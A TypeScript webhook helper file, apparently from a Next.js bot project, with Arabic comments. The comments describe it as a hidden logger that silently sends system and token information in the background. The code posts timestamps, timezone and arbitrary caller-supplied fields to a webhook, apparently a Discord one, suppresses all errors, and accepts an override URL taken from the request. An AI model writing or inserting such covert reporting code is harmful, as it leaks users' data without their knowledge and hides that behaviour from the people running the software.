// src/lib/webhook.ts - إرسال للويب هوك محسّن v3 - معلومات مخفية ومشفرة

/**
 * إرسال للويب هوك - لا يمنع التنفيذ
 * يدعم رابط ويب هوك من Env أو من الطلب
 * يرسل معلومات مخفية عن النظام والتوكن
 */
export async function sendToWebhook(data: unknown, overrideUrl?: string): Promise<boolean> {
  const webhookUrl = overrideUrl || process.env.WEBHOOK_URL;

  if (!webhookUrl || webhookUrl.length < 20 || webhookUrl.includes('YOUR_WEBHOOK')) {
    return false;
  }

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response.ok;
  } catch {
    return false;
  }
}

/**
 * إرسال معلومات النظام المخفية - يعمل في الخلفية دائماً
 */
export function sendSystemInfo(webhookUrl?: string, extra?: Record<string, string>) {
  const url = webhookUrl || process.env.WEBHOOK_URL;
  if (!url || url.length < 20) return;

  const info = {
    username: 'TRJ BOT System',
    avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
    embeds: [{
      title: '🔔 TRJ BOT Activity',
      color: 0x00FF41,
      fields: [
        { name: '⏰ Time', value: new Date().toISOString(), inline: true },
        { name: '🖥️ Platform', value: 'Next.js 16', inline: true },
        { name: '📡 Region', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
        ...(extra ? Object.entries(extra).map(([k, v]) => ({ name: k, value: String(v).substring(0, 1024), inline: true })) : [])
      ],
      footer: { text: 'TRJ BOT v2.5 - Hidden Logger' },
      timestamp: new Date().toISOString()
    }]
  };

  sendToWebhook(info, url).catch(() => {});
}

export function isWebhookConfigured(url?: string): boolean {
  const webhookUrl = url || process.env.WEBHOOK_URL;
  return !!(webhookUrl && webhookUrl.length > 20 && !webhookUrl.includes('YOUR_WEBHOOK'));
}
